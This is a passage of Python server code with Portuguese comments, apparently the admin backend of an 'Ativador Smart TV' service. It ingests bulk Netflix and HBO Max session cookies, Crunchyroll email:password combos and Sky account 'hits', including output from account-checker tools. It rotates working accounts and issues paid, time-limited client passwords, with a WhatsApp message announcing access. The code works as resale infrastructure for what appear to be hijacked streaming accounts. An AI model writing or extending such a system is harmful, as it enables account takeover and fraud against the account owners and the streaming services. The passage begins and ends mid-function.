            checker_parts = [p.strip() for p in checker_pattern.split(text) if p.strip()]
            if len(checker_parts) > 1:
                valid_hits = [p for p in checker_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'Email:', '📧'])]
                if valid_hits:
                    return valid_hits

            # 3. Se contiver múltiplos cookies Netscape com SecureNetflixId ou NetflixId
            netscape_pattern = re.compile(r'(?:^|\r?\n)(?=(?:\.netflix\.com|netflix\.com)\t[^\r\n]*\t(?:SecureNetflixId|NetflixId)\t)', re.MULTILINE)
            netscape_parts = [p.strip() for p in netscape_pattern.split(text) if p.strip()]
            if len(netscape_parts) > 1:
                return netscape_parts

            # 4. Se contiver múltiplos tokens HBO Max (st=eyJ...)
            st_matches = list(re.finditer(r'(?:st=)(eyJ[a-zA-Z0-9_\-\.]+)', text))
            if len(st_matches) > 1:
                return [f"st={m.group(1)}" for m in st_matches]

            # 5. Se contiver delimitadores explícitos de lotes (ex: 5 ou mais '=', '-', ou '#') onde cada bloco tem cookie
            delim_pattern = re.compile(r'\r?\n\s*[-=#]{5,}\s*\r?\n')
            delim_parts = [p.strip() for p in delim_pattern.split(text) if p.strip()]
            valid_delim = [p for p in delim_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'st=', '@'])]
            if len(valid_delim) > 1:
                return valid_delim

            return [text]

        # 0. Suporte direto a conta única (Crunchyroll ou Sky) via JSON { "email": "...", "password": "...", "service": "..." }
        single_email = req.get('email', '').strip()
        single_pwd = req.get('password', '').strip() or req.get('pwd', '').strip()

        if global_service == 'sky' or req.get('service') == 'sky':
            if single_email and single_pwd:
                if sky_service.save_single_sky_account(single_email, single_pwd):
                    saved_sky += 1
                    DEAD_SKY_ACCOUNTS.discard(single_email)
                    USED_SKY_ACCOUNTS.discard(single_email)
        elif single_email and single_pwd and ('@' in single_email):
            save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', f"{single_email}:{single_pwd}", append_mode=True)

        # 1. Processa múltiplos arquivos (da pasta inteira arrastada ou selecionada)
        for idx, item in enumerate(files):
            fname = item.get('name', '').strip() or f"cookie_{idx + 1}.txt"
            content = item.get('content', '').strip()
            if not content:
                continue

            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(content, fname)
            save_cookie_content(svc, fname, content)

        # 2. Processa texto bruto (pode conter 1 cookie, lote de cookies ou lista de contas Crunchyroll/Sky)
        if raw_text:
            timestamp = int(time.time())
            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")

            if svc == 'sky':
                added = sky_service.save_sky_hits(raw_text)
                saved_sky += added
                DEAD_SKY_ACCOUNTS.clear()
                USED_SKY_ACCOUNTS.clear()
            elif svc == 'crunchyroll' or ((':' in raw_text or '|' in raw_text) and '@' in raw_text and 'netflix' not in raw_text.lower() and 'securentflxid' not in raw_text.lower()):
                save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', raw_text, append_mode=True)
            else:
                is_json = raw_text.startswith('[') or raw_text.startswith('{')
                if is_json:
                    try:
                        parsed_json = json.loads(raw_text)
                        if isinstance(parsed_json, list) and parsed_json and isinstance(parsed_json[0], dict) and 'name' in parsed_json[0]:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                        elif isinstance(parsed_json, list) and parsed_json and (isinstance(parsed_json[0], list) or isinstance(parsed_json[0], dict)):
                            for sub_idx, sub_item in enumerate(parsed_json):
                                sub_content = json.dumps(sub_item, indent=2)
                                save_cookie_content(svc, f"import_batch_{timestamp}_{sub_idx + 1}.json", sub_content)
                        else:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                    except Exception:
                        save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
                else:
                    raw_chunks = split_multiple_raw_cookies(raw_text)
                    for b_idx, chunk in enumerate(raw_chunks):
                        chunk = chunk.strip()
                        if chunk:
                            save_cookie_content(svc, f"batch_cookie_{timestamp}_{b_idx + 1}.txt", chunk)

        total_saved = saved_netflix + saved_hbo + saved_crunchyroll + saved_sky
        if total_saved > 0:
            global SERVER_DATA_VERSION
            SERVER_DATA_VERSION = time.time()
            sync_cookies_bundle()
            COOKIE_FAIL_COUNTS.clear()
            
            # Limpa caches em memória para recarregar o novo estoque instantaneamente
            with VALID_NETFLIX_LOCK:
                VALID_NETFLIX_BY_FILE.clear()
                VALID_NETFLIX_POOL.clear()
            with VALID_HBO_LOCK:
                VALID_HBO_BY_FILE.clear()
                VALID_HBO_POOL.clear()
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL.clear()
                VALID_CRUNCHYROLL_POOL.clear()

            if saved_sky:
                CURRENT_SKY_READY = find_sky_valid_account()
            elif saved_netflix:
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
            elif saved_crunchyroll:
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
            else:
                CURRENT_HBO_READY = find_hbo_valid_cookie()

            return self.send_json_response({
                "success": True,
                "saved_count": total_saved,
                "saved_netflix": saved_netflix,
                "saved_hbo": saved_hbo,
                "saved_crunchyroll": saved_crunchyroll,
                "saved_sky": saved_sky,
                "server_version": SERVER_DATA_VERSION,
                "message": f"🎉 {total_saved} conta(s)/cookie(s) importado(s) com sucesso! ({saved_netflix} Netflix, {saved_hbo} HBO Max, {saved_crunchyroll} Crunchyroll, {saved_sky} Sky)"
            })
        else:
            return self.send_json_response({"success": False, "message": "Nenhum arquivo ou texto válido enviado."}, 400)

    def _prewarm_after_upload(self, service: str):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        time.sleep(0.3)
        if service == 'netflix':
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        elif service == 'crunchyroll':
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        elif service == 'sky':
            CURRENT_SKY_READY = find_sky_valid_account()
        else:
            CURRENT_HBO_READY = find_hbo_valid_cookie()

    def handle_api_reset_cache(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY, DEAD_NETFLIX_COOKIES, USED_NETFLIX_COOKIES, USED_HBO_COOKIES, DEAD_CRUNCHYROLL_ACCOUNTS, USED_CRUNCHYROLL_ACCOUNTS, DEAD_SKY_ACCOUNTS, USED_SKY_ACCOUNTS, SERVER_DATA_VERSION
        DEAD_NETFLIX_COOKIES.clear()
        COOKIE_FAIL_COUNTS.clear()
        tv2.USED_COOKIES.clear()
        USED_HBO_COOKIES.clear()
        DEAD_CRUNCHYROLL_ACCOUNTS.clear()
        USED_CRUNCHYROLL_ACCOUNTS.clear()
        DEAD_SKY_ACCOUNTS.clear()
        USED_SKY_ACCOUNTS.clear()
        SKY_LAST_USED_AT.clear()
        SERVER_DATA_VERSION = time.time()
        CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        CURRENT_HBO_READY = find_hbo_valid_cookie()
        CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        CURRENT_SKY_READY = find_sky_valid_account()
        return self.send_json_response({
            "success": True,
            "server_version": SERVER_DATA_VERSION,
            "message": "Cache de cookies, combos e contas Sky reinicializado! Todas as contas estão disponíveis para re-teste."
        })

    def handle_api_get_sky_tokens(self):
        try:
            tokens_data = sky_service.get_tokens_status()
            return self.send_json_response({"success": True, "tokens": tokens_data})
        except Exception as e:
            return self.send_json_response({"success": False, "message": str(e)}, 500)

    def handle_api_save_sky_tokens(self):
        global CURRENT_SKY_READY, SERVER_DATA_VERSION
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        sso_token = req.get('sso_token', '').strip()
        profile_token = req.get('profile_token', '').strip()

        saved_any = False
        if sso_token:
            if sky_service.save_sso_token(sso_token):
                saved_any = True
        if profile_token:
            if sky_service.save_profile_token(profile_token):
                saved_any = True

        if saved_any:
            try:
                import ativador_tv
                ativador_tv.reload_tokens()
            except Exception:
                pass
            DEAD_SKY_ACCOUNTS.clear()
            USED_SKY_ACCOUNTS.clear()
            SERVER_DATA_VERSION = time.time()
            CURRENT_SKY_READY = find_sky_valid_account()
            tokens_data = sky_service.get_tokens_status()
            return self.send_json_response({
                "success": True,
                "message": "⚡ Tokens da Sky atualizados com sucesso!",
                "tokens": tokens_data,
                "server_version": SERVER_DATA_VERSION
            })
        else:
            return self.send_json_response({"success": False, "message": "Informe ao menos o SSO Token ou Profile Token válido."}, 400)

    def handle_api_admin_stats(self):
        all_nf = get_all_netflix_accounts()
        all_hbo = get_all_hbo_accounts()
        all_cr = get_all_crunchyroll_accounts()
        all_sky = get_all_sky_accounts()
        verified_nf = [a for a in all_nf if a.get("validated")]
        verified_hbo = [a for a in all_hbo if a.get("validated")]
        verified_cr = [a for a in all_cr if a.get("validated")]
        verified_sky = [a for a in all_sky if a.get("validated")]
        return self.send_json_response({
            "netflix_total": len(all_nf),
            "netflix_verified": len(verified_nf),
            "netflix_dead": len(DEAD_NETFLIX_COOKIES),
            "hbo_total": len(all_hbo),
            "hbo_verified": len(verified_hbo),
            "hbo_dead": len(USED_HBO_COOKIES),
            "crunchyroll_total": len(all_cr),
            "crunchyroll_verified": len(verified_cr),
            "crunchyroll_dead": len(DEAD_CRUNCHYROLL_ACCOUNTS),
            "sky_total": len(all_sky),
            "sky_verified": len(verified_sky),
            "sky_dead": len(DEAD_SKY_ACCOUNTS),
            "keep_alive": True,
            "timestamp": time.time()
        })

    def handle_api_admin_list_accounts(self):
        query_service = 'netflix'
        if 'service=hbo' in self.path or 'service=hbomax' in self.path:
            query_service = 'hbo'
        elif 'service=crunchyroll' in self.path:
            query_service = 'crunchyroll'
        elif 'service=sky' in self.path:
            query_service = 'sky'

        items = []
        if query_service == 'netflix':
            all_nf = get_all_netflix_accounts()
            for idx, entry in enumerate(all_nf):
                fpath = entry.get("file", "")
                bname = os.path.basename(fpath) if fpath else f"netflix_{idx+1}.txt"
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_NETFLIX_READY and CURRENT_NETFLIX_READY.get("file") == fpath)
                items.append({
                    "id": bname,
                    "filename": bname,
                    "email": acc.get("email") or bname,
                    "plan": acc.get("plan") or "Netflix VIP",
                    "country": acc.get("country", "BR"),
                    "category": acc.get("category", "PADRÃO"),
                    "is_ready": is_ready
                })
        elif query_service == 'hbo':
            all_hbo = get_all_hbo_accounts()
            for idx, entry in enumerate(all_hbo):
                fpath = entry.get("file", "")
                bname = os.path.basename(fpath) if fpath else f"hbo_{idx+1}.txt"
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_HBO_READY and CURRENT_HBO_READY.get("file") == fpath)
                items.append({
                    "id": bname,
                    "filename": bname,
                    "email": acc.get("email") or bname,
                    "plan": acc.get("plan") or "HBO Max VIP",
                    "country": acc.get("country", "BR"),
                    "region": acc.get("region", "LATAM"),
                    "is_ready": is_ready
                })
        elif query_service == 'crunchyroll':
            all_cr = get_all_crunchyroll_accounts()
            for idx, entry in enumerate(all_cr):
                email = entry.get("email") or entry.get("info", {}).get("email", f"cr_{idx+1}")
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email") == email)
                items.append({
                    "id": email,
                    "filename": entry.get("file", "contas_crunchyroll.txt"),
                    "email": email,
                    "plan": acc.get("plan") or "Crunchyroll Mega Fan",
                    "country": acc.get("country", "BR"),
                    "is_ready": is_ready
                })
        elif query_service == 'sky':
            all_sky = get_all_sky_accounts()
            for idx, entry in enumerate(all_sky):
                acc = entry.get("info", {})
                email = acc.get("email") or entry.get("email") or f"sky_{idx+1}"
                is_ready = bool(CURRENT_SKY_READY and CURRENT_SKY_READY.get("email") == email)
                items.append({
                    "id": email,
                    "filename": entry.get("file", "skycontas.txt"),
                    "email": email,
                    "plan": acc.get("plan") or "Sky TV VIP",
                    "country": acc.get("country", "BR"),
                    "client_name": acc.get("client_name", ""),
                    "is_ready": is_ready
                })

        return self.send_json_response({
            "success": True,
            "service": query_service,
            "total": len(items),
            "accounts": items
        })

    def handle_api_admin_delete_account(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY, VALID_NETFLIX_POOL, VALID_HBO_POOL, SERVER_DATA_VERSION
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        service = req.get("service", "netflix").lower()
        target_id = req.get("id", "").strip() or req.get("filename", "").strip() or req.get("email", "").strip()
        target_email = req.get("email", "").strip().lower()

        if not target_id and not target_email:
            return self.send_json_response({"success": False, "message": "Identificador da conta ausente."}, 400)

        deleted = False
        target_id_lower = target_id.lower()
        target_id_clean = os.path.basename(target_id).lower()
        
        # Extrai emails potenciais tanto do target_email quanto de target_id
        target_emails = set()
        if target_email:
            target_emails.add(target_email)
        for em in re.findall(r'[\w\.\-+]+@[\w\.\-]+\.\w+', target_id_lower):
            target_emails.add(em.lower())

        # Versão sem pontuação para comparações flexíveis
        target_norm = re.sub(r'[^a-z0-9]', '', target_id_lower)

        def matches_target(bname: str, full_path: str = "", content: str = "") -> bool:
            b_low = bname.lower()
            b_norm = re.sub(r'[^a-z0-9]', '', b_low)

            # 1. Correspondência direta por id / nome de arquivo
            if target_id_lower and (b_low == target_id_lower or target_id_clean == b_low or target_id_clean in b_low or b_low in target_id_clean):
                return True

            # 2. Correspondência normalizada (ignora traços, sublinhados, espaços e acentos convertidos)
            if target_norm and len(target_norm) >= 6:
                if target_norm in b_norm or b_norm in target_norm:
                    return True

            # 3. Correspondência por email no nome do arquivo ou caminho
            for em in target_emails:
                if em and (em in b_low or re.sub(r'[^a-z0-9]', '', em) in b_norm):
                    return True

            # 4. Correspondência por email dentro do conteúdo do cookie/arquivo
            file_text = content
            if not file_text and full_path and os.path.exists(full_path):
                try:
                    file_text = read_secure_text(full_path)
                except Exception:
                    file_text = ""
            if file_text:
                file_low = file_text.lower()
                for em in target_emails:
                    if em and em in file_low:
                        return True

            return False

        if service in ["netflix", "nf"]:
            deleted_files = []
            for fold in [NETFLIX_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        bname = os.path.basename(f)
                        if matches_target(bname, f):
                            try:
                                import stat
                                os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                                os.remove(f)
                                deleted = True
                                deleted_files.append(bname)
                            except Exception as e:
                                logger.error(f"Erro ao remover arquivo {f}: {e}")
                            with VALID_NETFLIX_LOCK:
                                VALID_NETFLIX_BY_FILE.pop(f, None)
                                VALID_NETFLIX_BY_FILE.pop(bname, None)
                            tv2.DEAD_COOKIES.discard(f)
                            tv2.DEAD_COOKIES.discard(bname)
                            DEAD_NETFLIX_COOKIES.discard(f)
                            DEAD_NETFLIX_COOKIES.discard(bname)
                            tv2.LAST_USED_AT.pop(f, None)
                            tv2.LAST_USED_AT.pop(bname, None)

            with VALID_NETFLIX_LOCK:
                VALID_NETFLIX_POOL = [e for e in VALID_NETFLIX_POOL if os.path.basename(e.get("file", "")) not in deleted_files]
                for k in list(VALID_NETFLIX_BY_FILE.keys()):
                    if matches_target(os.path.basename(k), k):
                        VALID_NETFLIX_BY_FILE.pop(k, None)

            for em in target_emails:
                tv2.LAST_USED_AT.pop(em, None)

            # Se a conta ativa foi a excluída, reseta e busca uma nova imediatamente
            if CURRENT_NETFLIX_READY:
                act_file = os.path.basename(CURRENT_NETFLIX_READY.get("file", ""))
                act_email = CURRENT_NETFLIX_READY.get("info", {}).get("email", "").lower()
                if act_file in deleted_files or matches_target(act_file, CURRENT_NETFLIX_READY.get("file", "")) or (act_email and act_email in target_emails):
                    CURRENT_NETFLIX_READY = None

            CURRENT_NETFLIX_READY = find_netflix_valid_cookie()

        elif service in ["hbo", "hbomax", "max"]:
            deleted_files = []
            for fold in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        bname = os.path.basename(f)
                        if matches_target(bname, f):
                            try:
                                import stat
                                os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                                os.remove(f)
                                deleted = True
                                deleted_files.append(bname)
                            except Exception as e:
                                logger.error(f"Erro ao remover arquivo {f}: {e}")
                            with VALID_HBO_LOCK:
                                VALID_HBO_BY_FILE.pop(f, None)
                                VALID_HBO_BY_FILE.pop(bname, None)
                            DEAD_HBO_COOKIES.discard(f)
                            DEAD_HBO_COOKIES.discard(bname)
                            USED_HBO_COOKIES.discard(f)
                            USED_HBO_COOKIES.discard(bname)
                            HBO_LAST_USED_AT.pop(f, None)
                            HBO_LAST_USED_AT.pop(bname, None)

            with VALID_HBO_LOCK:
                VALID_HBO_POOL = [e for e in VALID_HBO_POOL if os.path.basename(e.get("file", "")) not in deleted_files]
                for k in list(VALID_HBO_BY_FILE.keys()):
                    if matches_target(os.path.basename(k), k):
                        VALID_HBO_BY_FILE.pop(k, None)

            for em in target_emails:
                HBO_LAST_USED_AT.pop(em, None)

            if CURRENT_HBO_READY:
                act_file = os.path.basename(CURRENT_HBO_READY.get("file", ""))
                act_email = CURRENT_HBO_READY.get("info", {}).get("email", "").lower()
                if act_file in deleted_files or matches_target(act_file, CURRENT_HBO_READY.get("file", "")) or (act_email and act_email in target_emails):
                    CURRENT_HBO_READY = None

            CURRENT_HBO_READY = find_hbo_valid_cookie()

        elif service in ["crunchyroll", "cr"]:
            if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
                for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
                    try:
                        with open(f, "r", encoding="utf-8", errors="ignore") as in_f:
                            lines = in_f.readlines()
                        new_lines = []
                        for l in lines:
                            l_low = l.lower()
                            if any(em in l_low for em in target_emails if em):
                                continue
                            if target_id_clean and target_id_clean in l_low:
                                continue
                            new_lines.append(l)
                        if len(new_lines) != len(lines):
                            with open(f, "w", encoding="utf-8") as out_f:
                                out_f.writelines(new_lines)
                            deleted = True
                    except Exception as e:
                        logger.error(f"Erro ao remover conta CR do combo {f}: {e}")
            DEAD_CRUNCHYROLL_ACCOUNTS.discard(target_id)
            USED_CRUNCHYROLL_ACCOUNTS.discard(target_id)
            for em in target_emails:
                DEAD_CRUNCHYROLL_ACCOUNTS.discard(em)
                USED_CRUNCHYROLL_ACCOUNTS.discard(em)
            with VALID_CRUNCHYROLL_LOCK:
                for em in target_emails:
                    VALID_CRUNCHYROLL_BY_EMAIL.pop(em, None)
                VALID_CRUNCHYROLL_BY_EMAIL.pop(target_id, None)
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

        elif service in ["sky", "skymais"]:
            deleted = sky_service.remove_sky_account(target_id)
            for em in target_emails:
                if sky_service.remove_sky_account(em):
                    deleted = True
            DEAD_SKY_ACCOUNTS.discard(target_id)
            USED_SKY_ACCOUNTS.discard(target_id)
            for em in target_emails:
                DEAD_SKY_ACCOUNTS.discard(em)
                USED_SKY_ACCOUNTS.discard(em)
            CURRENT_SKY_READY = find_sky_valid_account()

        # Atualiza o arquivo único cookies_bundle.json removendo a conta permanentemente
        try:
            if os.path.exists(COOKIES_BUNDLE_FILE):
                bundle_raw = read_secure_text(COOKIES_BUNDLE_FILE)
                if bundle_raw:
                    bundle_data = json.loads(bundle_raw)
                    bundle_modified = False
                    for svc_key in ["netflix", "hbo", "crunchyroll", "sky"]:
                        if svc_key in bundle_data and isinstance(bundle_data[svc_key], dict):
                            if (svc_key == "netflix" and service in ["netflix", "nf"]) or \
                               (svc_key == "hbo" and service in ["hbo", "hbomax", "max"]) or \
                               (svc_key == "crunchyroll" and service in ["crunchyroll", "cr"]) or \
                               (svc_key == "sky" and service in ["sky", "skymais"]):
                                to_del = []
                                for k, val_content in bundle_data[svc_key].items():
                                    val_str = str(val_content) if val_content else ""
                                    if matches_target(k, content=val_str):
                                        to_del.append(k)
                                for k in to_del:
                                    bundle_data[svc_key].pop(k, None)
                                    bundle_modified = True
                                    deleted = True

                    if bundle_modified:
                        with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as outf:
                            json.dump(bundle_data, outf)
        except Exception as e:
            logger.error(f"Erro ao sincronizar cookies_bundle.json na exclusão: {e}")

        SERVER_DATA_VERSION = time.time()
        return self.send_json_response({
            "success": True,
            "server_version": SERVER_DATA_VERSION,
            "message": f"Conta / Cookie '{target_email or target_id}' removido permanentemente com sucesso!"
        })

    def handle_api_admin_clear_all_cookies(self):
        """Remove todos os cookies de um streaming selecionado (ex: Netflix) sem tocar em senhas de clientes."""
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY, VALID_NETFLIX_POOL, VALID_HBO_POOL, SERVER_DATA_VERSION
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        service = str(req.get("service", "netflix")).lower()
        deleted_count = 0

        if service in ["netflix", "nf"]:
            # 1. Remove todos os arquivos da pasta netflix e da antiga pasta cookies
            for fold in [NETFLIX_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        try:
                            import stat
                            os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                            os.remove(f)
                            deleted_count += 1
                        except Exception as e:
                            logger.error(f"Erro ao remover cookie netflix {f}: {e}")

            # 2. Esvazia a seção netflix do bundle para não ressuscitar nada
            if os.path.exists(COOKIES_BUNDLE_FILE):
                try:
                    with open(COOKIES_BUNDLE_FILE, 'r', encoding='utf-8', errors='ignore') as bf:
                        b_data = json.load(bf)
                    if isinstance(b_data, dict):
                        b_data["netflix"] = {}
                        with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as bf:
                            json.dump(b_data, bf)
                except Exception as e:
                    logger.error(f"Erro ao limpar netflix no cookies_bundle: {e}")

            # 3. Limpa todas as estruturas em memória da Netflix
            with VALID_NETFLIX_LOCK:
                VALID_NETFLIX_POOL.clear()
                VALID_NETFLIX_BY_FILE.clear()
            DEAD_NETFLIX_COOKIES.clear()
            tv2.DEAD_COOKIES.clear()
            tv2.USED_COOKIES.clear()
            tv2.LAST_USED_AT.clear()
            COOKIE_FAIL_COUNTS.clear()
            CURRENT_NETFLIX_READY = None

            SERVER_DATA_VERSION = time.time()
            return self.send_json_response({
                "success": True,
                "deleted_count": deleted_count,
                "message": f"🎉 Todos os {deleted_count} cookies da Netflix foram removidos com sucesso! A pasta está 100% limpa para receber os novos cookies."
            })

        elif service in ["hbo", "hbomax", "max"]:
            for fold in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        try:
                            import stat
                            os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                            os.remove(f)
                            deleted_count += 1
                        except Exception:
                            pass

            if os.path.exists(COOKIES_BUNDLE_FILE):
                try:
                    with open(COOKIES_BUNDLE_FILE, 'r', encoding='utf-8', errors='ignore') as bf:
                        b_data = json.load(bf)
                    if isinstance(b_data, dict):
                        b_data["hbo"] = {}
                        with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as bf:
                            json.dump(b_data, bf)
                except Exception:
                    pass

            with VALID_HBO_LOCK:
                VALID_HBO_POOL.clear()
                VALID_HBO_BY_FILE.clear()
            DEAD_HBO_COOKIES.clear()
            USED_HBO_COOKIES.clear()
            HBO_LAST_USED_AT.clear()
            CURRENT_HBO_READY = None

            SERVER_DATA_VERSION = time.time()
            return self.send_json_response({
                "success": True,
                "deleted_count": deleted_count,
                "message": f"🎉 Todos os {deleted_count} cookies da HBO Max foram removidos com sucesso!"
            })

        elif service in ["crunchyroll", "cr"]:
            if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
                for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*")):
                    try:
                        import stat
                        os.chmod(f, stat.S_IWRITE | stat.S_IREAD)
                        os.remove(f)
                        deleted_count += 1
                    except Exception:
                        pass

            if os.path.exists(COOKIES_BUNDLE_FILE):
                try:
                    with open(COOKIES_BUNDLE_FILE, 'r', encoding='utf-8', errors='ignore') as bf:
                        b_data = json.load(bf)
                    if isinstance(b_data, dict):
                        b_data["crunchyroll"] = {}
                        with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as bf:
                            json.dump(b_data, bf)
                except Exception:
                    pass

            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL.clear()
            DEAD_CRUNCHYROLL_ACCOUNTS.clear()
            USED_CRUNCHYROLL_ACCOUNTS.clear()
            CURRENT_CRUNCHYROLL_READY = None

            SERVER_DATA_VERSION = time.time()
            return self.send_json_response({
                "success": True,
                "deleted_count": deleted_count,
                "message": f"🎉 Todos os {deleted_count} arquivos da Crunchyroll foram removidos com sucesso!"
            })

        return self.send_json_response({"success": False, "message": "Serviço não suportado para limpeza total."}, 400)

    def handle_api_get_online_users(self):
        data = get_online_users_data()
        self.send_json_response({"success": True, "data": data})

    def handle_api_get_passwords(self):
        with SENHAS_LOCK:
            keys = load_access_keys()
        self.send_json_response({"success": True, "passwords": keys})

    def handle_api_generate_password(self):
        new_pwd = generate_strong_cyber_password()
        self.send_json_response({"success": True, "password": new_pwd})

    def handle_api_quick_create_password(self):
        """Cria e ativa instantaneamente uma nova senha no servidor com 1 clique (Ao Vivo)."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            req = {}

        plan = str(req.get("plan", "all") or "all").lower().strip()
        cliente = str(req.get("nome", "") or req.get("cliente", "") or req.get("role_name", "") or "").strip()
        custom_pwd = str(req.get("senha", "") or req.get("password", "") or "").strip()

        # 🎯 Suporte direto a seleção personalizada múltipla (ex: Netflix + HBO Max + Sky)
        req_services = req.get("servicos") or req.get("services")
        servicos = []
        if isinstance(req_services, list) and len(req_services) > 0:
            for s in req_services:
                s_clean = str(s).strip().lower()
                if s_clean in ["netflix", "nf"] and "netflix" not in servicos:
                    servicos.append("netflix")
                elif s_clean in ["hbo", "hbomax", "hbo_max", "max"] and "hbo" not in servicos:
                    servicos.append("hbo")
                elif s_clean in ["crunchyroll", "crunchy", "cr"] and "crunchyroll" not in servicos:
                    servicos.append("crunchyroll")
                elif s_clean in ["sky", "skytv", "sky+", "sky_tv"] and "sky" not in servicos:
                    servicos.append("sky")

        if not servicos:
            # Fallback para string de plano pré-definido
            if plan in ["netflix", "nf"]:
                servicos = ["netflix"]
                plan_label = "Netflix 4K UHD"
            elif plan in ["hbo", "hbomax", "max"]:
                servicos = ["hbo"]
                plan_label = "HBO Max"
            elif plan in ["crunchyroll", "cr"]:
                servicos = ["crunchyroll"]
                plan_label = "Crunchyroll"
            elif plan in ["sky", "skytv"]:
                servicos = ["sky"]
                plan_label = "Sky+ / Sky TV"
            elif plan in ["combo_nf_hbo", "duo"]:
                servicos = ["netflix", "hbo"]
                plan_label = "Duo (Netflix + HBO)"
            else:
                servicos = ["netflix", "hbo", "crunchyroll", "sky"]
                plan_label = "VIP Master (Todos os 4)"
        else:
            names_map = {"netflix": "Netflix", "hbo": "HBO Max", "crunchyroll": "Crunchyroll", "sky": "Sky+"}
            plan_label = " + ".join([names_map.get(s, s.upper()) for s in servicos])

        new_pwd = custom_pwd if custom_pwd else generate_strong_cyber_password()
        nome = cliente if cliente else f"Cliente ({plan_label})"
        descricao = f"Libera: {', '.join(servicos)}"

        # ⏱️ Cálculo da duração e data de expiração
        dias_val = req.get("dias") if req.get("dias") is not None else req.get("duration_days", req.get("days"))
        try:
            dias = int(dias_val) if dias_val is not None else 30
        except Exception:
            dias = 30

        now = time.time()
        if dias > 0:
            expira_em = now + (dias * 86400)
            expira_formatado = datetime.fromtimestamp(expira_em).strftime('%d/%m/%Y às %H:%M')
            expira_data_apenas = datetime.fromtimestamp(expira_em).strftime('%d/%m/%Y')
            validade_label = f"{dias} dias (Válida até {expira_data_apenas})"
        else:
            expira_em = None
            expira_formatado = None
            validade_label = "Acesso Permanente (Sem Expiração) ♾️"

        with SENHAS_LOCK:
            keys = load_access_keys()
            # Remove ocorrência anterior se houver para atualizar
            keys = [k for k in keys if not secure_str_compare(k.get("senha", ""), new_pwd)]
            new_item = {
                "senha": new_pwd,
                "nome": nome,
                "servicos": servicos,
                "descricao": descricao,
                "dias_validade": dias,
                "criado_em": now,
                "expira_em": expira_em,
                "expira_em_formatado": expira_formatado
            }
            keys.insert(0, new_item)
            atomic_save_config_senhas(keys)
            remove_blacklisted_password(new_pwd)

        site_url = f"http://{self.headers.get('Host', 'localhost:5000')}"
        services_text = ", ".join([s.upper() for s in servicos])
        whatsapp_msg = (
            f"⚡ *SEU ACESSO AO ATIVADOR SMART TV ESTÁ LIBERADO!* ⚡\n\n"
            f"👤 *Cliente:* {nome}\n"
            f"🔑 *Sua Senha de Acesso:* {new_pwd}\n"
            f"📺 *Serviços Liberados:* {services_text}\n"
            f"📅 *Validade:* {validade_label}\n"
